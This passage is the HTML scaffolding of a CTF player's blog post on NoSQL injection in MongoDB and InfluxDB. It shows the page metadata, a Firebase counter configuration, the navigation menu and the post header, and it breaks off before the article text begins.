<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  <title>nosql-inject(mangodb and influxdb) &middot; Delete&#39;s blog</title>
    <meta name="title" content="nosql-inject(mangodb and influxdb) &middot; Delete&#39;s blog">

  
  <meta name="description" content="A CTFer find something funny">
  <meta name="keywords" content="NOSQL,">
  
  
  <link rel="canonical" href="https://example.org/posts/nosql-inject/">
  
  
  
  
  
  
  
  
  
    
  
  
    
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.ef9a1bb2d3bdeecffefe013a7e65d531e98b6f81da6ac2279d625f285cbdaac095f250fda177b0416ddbd6ae31163ca773093662b1665aa4fbcf9279df970997.css"
    integrity="sha512-75obstO97s/&#43;/gE6fmXVMemLb4HaasInnWJfKFy9qsCV8lD9oXewQW3b1q4xFjyncwk2YrFmWqT7z5J535cJlw==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
    
    
    
  
  
    
    
  
  
  
  
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.23ea3460af5452ae8f79e1d229b2694d6acd1a8f21fc49784791d34b0b171648e4bf38275b7c39a9d11f1ac8f551b76a6381522262cfc1a1df6caaf9eb86adaa.js"
      integrity="sha512-I&#43;o0YK9UUq6PeeHSKbJpTWrNGo8h/El4R5HTSwsXFkjkvzgnW3w5qdEfGsj1UbdqY4FSImLPwaHfbKr564atqg=="
      data-copy="Copy"
      data-copied="Copied"></script>
  
  
    
    <script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js" integrity="sha512-tLci/LXULzT1KzCpLzUhtp9APKnZbQ1heetTfLhw9dg/3x/oNmiNldXJn&#43;&#43;9pBcEh3EQBuVgUfpn6gDaEFIXIQ=="></script>
  

  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  
  
  
  
  

  
  <meta property="og:url" content="https://example.org/posts/nosql-inject/">
  <meta property="og:site_name" content="Delete&#39;s blog">
  <meta property="og:title" content="nosql-inject(mangodb and influxdb)">
  <meta property="og:description" content="A CTFer find something funny">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-02-01T23:27:59+08:00">
    <meta property="article:modified_time" content="2024-02-01T23:27:59+08:00">
    <meta property="article:tag" content="NOSQL">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="nosql-inject(mangodb and influxdb)">
  <meta name="twitter:description" content="A CTFer find something funny">

  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "nosql-inject(mangodb and influxdb)",
    "headline": "nosql-inject(mangodb and influxdb)",
    
    
    "inLanguage": "en",
    "url" : "https:\/\/example.org\/posts\/nosql-inject\/",
    "author" : {
      "@type": "Person",
      "name": "Delete\u0027s blog"
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-02-01T23:27:59\u002b08:00",
    "datePublished": "2024-02-01T23:27:59\u002b08:00",
    
    "dateModified": "2024-02-01T23:27:59\u002b08:00",
    
    "keywords": ["NOSQL"],
    
    "mainEntityOfPage": "true",
    "wordCount": "1677"
  }]
  </script>



  
  
    <meta name="author" content="Delete&#39;s blog">
  
  
    
      
        
          <link href="delete@student.gdufe.edu.cn" rel="me">
        
      
    
      
        
          <link href="https://github.com/ML-hacker" rel="me">
        
      
    
  

  
  

<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>























  
  





  
  

  
  

  
  
    
      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
  <script>

    const firebaseConfig = {
      apiKey: "AIzaSyCttX9CvLt5q9ivhSRRldSgNxB4loLvwSo",
      authDomain: "AIzaSyCttX9CvLt5q9ivhSRRldSgNxB4loLvwSo",
      projectId: "like-6851a",
      storageBucket: "like-6851a.firebasestorage.app",
      messagingSenderId: "663302573870",
      appId: "1:663302573870:web:db2818ca9e5ea64c41f4bf",
      measurementId: "G-FNF9MJ1961"
    };

    var app = firebase.initializeApp(firebaseConfig);
    var db = firebase.firestore();
    var auth = firebase.auth();

  </script>
    
  

  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content">
        <span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>
        Skip to main content
      </a>
    </div>
    
    
      <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100">
  <div
    id="menu-blur"
    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
  <div class="relative max-w-[64rem] ml-auto mr-auto">
    













<div
  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
  
  

  <div class="flex flex-1 items-center justify-between">
    <nav class="flex space-x-3">
      
        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
          Delete&rsquo;s blog
        </a>
      
    </nav>
    
  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
    
      
        
  <a
  href="/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
    <span class="mr-1">
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
<path fill="currentColor" d="M0 32v448h448V32H0zm21.2 197.2H21c.1-.1.2-.3.3-.4 0 .1 0 .3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z"/></svg></span>
    </span>
  
  <p class="text-base font-medium" title="Delete&#39;s blog">
    Home
  </p>
</a>



      
        
  <a
  href="/posts/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
    <span class="mr-1">
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
<path fill="currentColor" d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span>
    </span>
  
  <p class="text-base font-medium" title="Posts">
    Post
  </p>
</a>



      
        
  <a
  href="/friends/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
    <span class="mr-1">
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4 0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4c0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8 0L0 176z"/></svg></span>
    </span>
  
  <p class="text-base font-medium" title="友链">
    Friend
  </p>
</a>



      
        
  <a
  href="/about/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
    <span class="mr-1">
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512">
<path fill="currentColor" d="M50.8 452.1L19.2 477.4c-2.1 1.7-4.7 2.6-7.4 2.6C5.3 480 0 474.7 0 468.2V192C0 86 86 0 192 0S384 86 384 192V468.2c0 6.5-5.3 11.8-11.8 11.8c-2.7 0-5.3-.9-7.4-2.6l-31.6-25.3c-3.3-2.7-7.5-4.1-11.8-4.1c-5.9 0-11.5 2.8-15 7.5l-37.6 50.1c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4l-38.4-51.2c-3-4-7.8-6.4-12.8-6.4s-9.8 2.4-12.8 6.4l-38.4 51.2c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4L77.6 455.5c-3.6-4.7-9.1-7.5-15-7.5c-4.3 0-8.4 1.5-11.7 4.1zM160 192c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32zm96 32c17.7 0 32-14.3 32-32s-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32z"/></svg></span>
    </span>
  
  <p class="text-base font-medium" title="ABOUT MEEE">
    About
  </p>
</a>



      
    

    

    

    
      <button
        id="search-button"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
      <div class=" flex items-center">
        <button
          id="appearance-switcher"
          aria-label="Dark mode switcher"
          type="button"
          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
          <div class="flex items-center justify-center dark:hidden">
            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
          </div>
          <div class="items-center justify-center hidden dark:flex">
            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
          </div>
        </button>
      </div>
    
  </nav>

    
  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
    <span></span>

    

    

    
      <button
        id="search-button-mobile"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
      <button
        id="appearance-switcher-mobile"
        aria-label="Dark mode switcher"
        type="button"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
        <div class="flex items-center justify-center dark:hidden">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
        </div>
        <div class="items-center justify-center hidden dark:flex">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
        </div>
      </button>
    
  </div>

  </div>
  
  <div class="-my-2 md:hidden">
    <div id="menu-button" class="block">
      
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
          <ul
            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
            <li id="menu-close-button">
              <span
                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
              </span>
            </li>

            
              
  <li class="mt-1">
  <a
    href="/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
      <div class="mr-2">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
<path fill="currentColor" d="M0 32v448h448V32H0zm21.2 197.2H21c.1-.1.2-.3.3-.4 0 .1 0 .3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z"/></svg></span>
      </div>
    
    <p class="text-bg font-bg" title="Delete&#39;s blog">
      Home
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/posts/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
      <div class="mr-2">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
<path fill="currentColor" d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span>
      </div>
    
    <p class="text-bg font-bg" title="Posts">
      Post
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/friends/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
      <div class="mr-2">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4 0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4c0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8 0L0 176z"/></svg></span>
      </div>
    
    <p class="text-bg font-bg" title="友链">
      Friend
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/about/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
      <div class="mr-2">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512">
<path fill="currentColor" d="M50.8 452.1L19.2 477.4c-2.1 1.7-4.7 2.6-7.4 2.6C5.3 480 0 474.7 0 468.2V192C0 86 86 0 192 0S384 86 384 192V468.2c0 6.5-5.3 11.8-11.8 11.8c-2.7 0-5.3-.9-7.4-2.6l-31.6-25.3c-3.3-2.7-7.5-4.1-11.8-4.1c-5.9 0-11.5 2.8-15 7.5l-37.6 50.1c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4l-38.4-51.2c-3-4-7.8-6.4-12.8-6.4s-9.8 2.4-12.8 6.4l-38.4 51.2c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4L77.6 455.5c-3.6-4.7-9.1-7.5-15-7.5c-4.3 0-8.4 1.5-11.7 4.1zM160 192c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32zm96 32c17.7 0 32-14.3 32-32s-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32z"/></svg></span>
      </div>
    
    <p class="text-bg font-bg" title="ABOUT MEEE">
      About
    </p>
  </a>
</li>



            

          </ul>
          
        </div>
      
    </div>
  </div>

</div>




  <script>
    (function () {
      var $mainmenu = $(".main-menu");
      var path = window.location.pathname;
      $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
        $(e).children("p").addClass("active");
      });
    })();
  </script>


  </div>
</div>


<script
  type="text/javascript"
  src="/js/background-blur.min.0ad33cb9c066f652728b2cc09c9ceaf32645544f48e8b6b38f120d86f433ed997da275a49e6151fe0176430c45376812708d84727f3f969101fb44a4345b3f34.js"
  integrity="sha512-CtM8ucBm9lJyiyzAnJzq8yZFVE9I6LazjxINhvQz7Zl9onWknmFR/gF2QwxFN2gScI2Ecn8/lpEB&#43;0SkNFs/NA=="
  data-target-id="menu-blur"></script>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  
  <article>
    
    
      
      
      
      
        
  
    
      
    
  

  
    
      
    
  


    
      <div
        class="w-full rounded-md h-36 md:h-56 lg:h-72 single_hero_basic nozoom"
        style="background-image:url(/img/featured.svg);"></div>
    
  <div class="single_hero_background nozoom fixed inset-x-0 top-0 h-[800px]">
    
      
        <img
          id="background-image-main"
          src="/img/background.svg"
          alt="Background Image"
          class="absolute inset-0 h-full w-full object-cover">
      
    
    <div
      class="from-neutral absolute inset-0 bg-gradient-to-t to-transparent mix-blend-normal dark:from-neutral-800"></div>
    <div
      class="from-neutral to-neutral absolute inset-0 bg-gradient-to-t opacity-30 mix-blend-normal dark:from-neutral-800 dark:to-neutral-800 dark:opacity-60"></div>
  </div>
  <div
    id="background-blur"
    class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
  
  
  <script
    type="text/javascript"
    src="/js/background-blur.min.0ad33cb9c066f652728b2cc09c9ceaf32645544f48e8b6b38f120d86f433ed997da275a49e6151fe0176430c45376812708d84727f3f969101fb44a4345b3f34.js"
    integrity="sha512-CtM8ucBm9lJyiyzAnJzq8yZFVE9I6LazjxINhvQz7Zl9onWknmFR/gF2QwxFN2gScI2Ecn8/lpEB&#43;0SkNFs/NA=="
    data-target-id="background-blur"
    data-image-id="background-image-main"
    data-image-url="/img/background.svg"></script>


      
    

    
    <header id="single_header" class="mt-5 max-w-prose">
      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        nosql-inject(mangodb and influxdb)
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  
    
  

  
  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2024-02-01T23:27:59&#43;08:00">1 February 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1677 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
  
  
    
    
      
      
        
        
      
      
    
  
  <span
    id="views_posts\nosql-inject.md"
    class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400"
    title="views"
    >loading</span
  >
  <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
<path fill="currentColor" d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></span>
</span>
<span class="px-2 text-primary-500">&middot;</span><span>
  
  
    
    
      
      
        
        
      
      
    
  
  <span
    id="likes_posts\nosql-inject.md"
    class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400"
    title="likes"
    >loading</span
  >
  <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span>
</span>
<span class="px-2 text-primary-500">&middot;</span><span>
  <button
    id="button_likes"
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    <span id="button_likes_heart" class="inline-block align-text-bottom hidden"
      ><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span>
    </span>
    <span id="button_likes_emtpty_heart" class="inline-block align-text-bottom"
      ><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<path fill="currentColor" d="M244 84L255.1 96L267.1 84.02C300.6 51.37 347 36.51 392.6 44.1C461.5 55.58 512 115.2 512 185.1V190.9C512 232.4 494.8 272.1 464.4 300.4L283.7 469.1C276.2 476.1 266.3 480 256 480C245.7 480 235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1 0 232.4 0 190.9V185.1C0 115.2 50.52 55.58 119.4 44.1C164.1 36.51 211.4 51.37 244 84C243.1 84 244 84.01 244 84L244 84zM255.1 163.9L210.1 117.1C188.4 96.28 157.6 86.4 127.3 91.44C81.55 99.07 48 138.7 48 185.1V190.9C48 219.1 59.71 246.1 80.34 265.3L256 429.3L431.7 265.3C452.3 246.1 464 219.1 464 190.9V185.1C464 138.7 430.4 99.07 384.7 91.44C354.4 86.4 323.6 96.28 301.9 117.1L255.1 163.9z"/></svg></span></span
    >
    <span id="button_likes_text">&nbsp;Like</span>
  </button>
</span>
    

    
    
  </div>

  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] mr-2" href="/categories/web/"
                ><span class="flex cursor-pointer">
  <span
